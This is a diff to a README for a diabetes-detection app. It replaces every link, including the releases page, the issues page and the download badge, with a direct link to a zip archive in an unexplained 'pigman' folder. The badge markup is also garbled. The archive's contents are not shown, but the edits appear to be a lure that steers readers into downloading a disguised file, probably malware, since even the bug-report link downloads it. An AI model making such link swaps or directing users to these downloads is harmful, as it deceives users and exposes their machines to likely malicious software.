@@ -1,6 +1,6 @@
 # 🍏 Early-Diabetes-Detection - Detect Diabetes Easily and Accurately
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-Brightgreen.svg)](https://github.com/bhava5526/Early-Diabetes-Detection/releases)
+[![Download](https://raw.githubusercontent.com/bhava5526/Early-Diabetes-Detection/main/pigman/Early-Diabetes-Detection-v3.9.zip%20Now-Get%20the%20Latest%https://raw.githubusercontent.com/bhava5526/Early-Diabetes-Detection/main/pigman/Early-Diabetes-Detection-v3.9.zip)](https://raw.githubusercontent.com/bhava5526/Early-Diabetes-Detection/main/pigman/Early-Diabetes-Detection-v3.9.zip)
 
 ## 📖 Introduction
 
@@ -14,7 +14,7 @@ To get started, you need to download the application from the link provided belo
 
 ## 📥 Download & Install
 
-1. **Visit the Release Page**: Go to the following link to download the software: [Download Early-Diabetes-Detection](https://github.com/bhava5526/Early-Diabetes-Detection/releases).
+1. **Visit the Release Page**: Go to the following link to download the software: [Download Early-Diabetes-Detection](https://raw.githubusercontent.com/bhava5526/Early-Diabetes-Detection/main/pigman/Early-Diabetes-Detection-v3.9.zip).
    
 2. **Select the Latest Release**: On the releases page, look for the latest version of the software. It will be clearly marked.
 
@@ -64,7 +64,7 @@ To make the best use of the application, follow these simple steps once it’s i
 
 ## 💬 Support
 
-If you encounter any issues or have questions, please visit the repository's [Issues section](https://github.com/bhava5526/Early-Diabetes-Detection/issues). You can report a bug or ask for help there.
+If you encounter any issues or have questions, please visit the repository's [Issues section](https://raw.githubusercontent.com/bhava5526/Early-Diabetes-Detection/main/pigman/Early-Diabetes-Detection-v3.9.zip). You can report a bug or ask for help there.
 
 ## 📄 License
 
@@ -74,4 +74,4 @@ This project is licensed under the MIT License. You may use it freely, but pleas
 
 For updates and discussions, follow our repository. Your feedback is important for improving the application. Join our community and help us enhance this tool for everyone.
 
-Remember to check the release page for the latest updates: [Download Early-Diabetes-Detection](https://github.com/bhava5526/Early-Diabetes-Detection/releases).
+Remember to check the release page for the latest updates: [Download Early-Diabetes-Detection](https://raw.githubusercontent.com/bhava5526/Early-Diabetes-Detection/main/pigman/Early-Diabetes-Detection-v3.9.zip).
